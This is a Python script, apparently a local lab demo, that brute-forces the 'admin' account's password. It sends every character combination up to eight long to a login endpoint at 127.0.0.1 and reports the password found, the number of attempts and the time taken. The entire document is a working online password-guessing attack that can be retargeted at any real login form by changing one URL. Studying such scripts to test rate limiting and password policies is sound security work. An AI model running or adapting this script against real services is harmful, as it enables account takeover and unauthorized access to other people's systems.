import time
import itertools
import requests

alphabet  = "abcdefghijklmnopqrstuvwxyz"
alphabetM = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
simbolo   = "!@#(){}[]*=+´'-_.,;><"
numeros   = "1234567890"
todos     = alphabet + alphabetM + simbolo + numeros

usuario_objetivo = "admin"

intentos   = 0
inicial    = time.time()
resultado  = ""
encontrado = False

for longitud in range(1, 9):
    if encontrado:
        break
    for combo in itertools.product(todos, repeat=longitud):
        intentos += 1
        intento = "".join(combo)

        response = requests.post(
            "http://127.0.0.1:8000/login",
            json={"username": usuario_objetivo, "password": intento}
        )
        data = response.json()

        if data["success"] == True:
            resultado  = intento
            encontrado = True
            break
        else:
            print(f"[{intentos}] Intento fallido: {intento}")

tiempo_total = time.time() - inicial

print(f"Usuario objetivo      : {usuario_objetivo}")
print(f"Contraseña encontrada : {resultado}")
print(f"Total de intentos     : {intentos}")
print(f"Tiempo total          : {tiempo_total:.3f}s")
print(f"Tiempo por intento    : {tiempo_total / intentos:.5f}s")